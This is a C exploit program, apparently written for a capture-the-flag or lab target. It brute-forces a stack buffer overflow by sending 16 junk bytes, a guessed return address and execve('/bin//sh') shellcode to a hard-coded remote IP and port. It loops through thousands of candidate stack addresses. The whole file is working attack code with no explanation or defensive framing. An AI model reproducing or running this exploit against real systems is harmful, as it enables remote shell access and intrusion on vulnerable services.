#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h>  
#include <string.h>  
#include <netdb.h>  
#include <sys/socket.h>  
#include <netinet/in.h>  
#include <arpa/inet.h>  

#define JUNK_SIZE 0x10
#define WORD_LENGTH 0x08

int main(int argc, char *argv[]) {  
    unsigned char shellcode[] = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05";
    unsigned int SHELLCODE_LENGTH = sizeof(shellcode);
    printf("[+] Shellcode Length : %d\n", SHELLCODE_LENGTH);

    // unsigned int PORT = atoi(argv[2]);
    // unsigned char *HOST = argv[1];
    /*
    unsigned int PORT = 9999;
    unsigned char *HOST = "127.0.0.1";
    */
    unsigned int PORT = 30000;
    unsigned char *HOST = "198.199.107.165";

    unsigned char payload[JUNK_SIZE + WORD_LENGTH + sizeof(shellcode)] = {0};
    printf("[+] Payload length : %d\n", sizeof(payload));
    memcpy(payload, "AAAAAAAAAAAAAAAA", JUNK_SIZE);
    memcpy(payload + JUNK_SIZE + WORD_LENGTH, &shellcode, SHELLCODE_LENGTH);

    unsigned long int start_addr = 0x7fffffffffff + 1;
    unsigned long int addr = 0x7fffffffffff + 1;
    unsigned int i = 0;
    for(i = 0; i < 0x2000; i++){
        /* Build payload */
        addr = start_addr - i * 8;
        memcpy(payload + JUNK_SIZE, &addr, WORD_LENGTH);
        printf("[?] %lx\n", addr);
        /*
        int j = 0;
        for (j = 0; j < 60 + 1; j++){
            printf("%02x", *(payload+j));
        }
        */
        /* connect to server */
        int sockfd;  
        struct sockaddr_in server_addr;  
        struct hostent *host;  
        host = gethostbyname(HOST);  
        sockfd = socket(AF_INET, SOCK_STREAM, 0);  
        if (sockfd == -1) {  
            perror("Create socket error!\n");
            exit(1);  
        }else{
            // printf("Create socket successful!\n");
        }
        bzero(&server_addr, sizeof(server_addr));  
        server_addr.sin_family = AF_INET;  
        server_addr.sin_port = htons(PORT);
        server_addr.sin_addr = *((struct in_addr*) host->h_addr);  
        int cn = connect(sockfd, (struct sockaddr *) &server_addr, sizeof(server_addr));  
        if (cn == -1) {  
            perror("Connect server error!\n");
            exit(1);  
        }else{
            // printf("Connect successful!\n");
        }
        /* send payload */
        int size = JUNK_SIZE + WORD_LENGTH + SHELLCODE_LENGTH;
        // printf("[+] Write size : %d\n", size);
        write(sockfd, payload, size);
        /* wait for server response */
        usleep(1000);
        /* read from server */
        char buffer[1024] = {0};
        read(sockfd, buffer, 1024);
        read(sockfd, buffer, 1024);
        close(sockfd);
    }
    return 0;
}

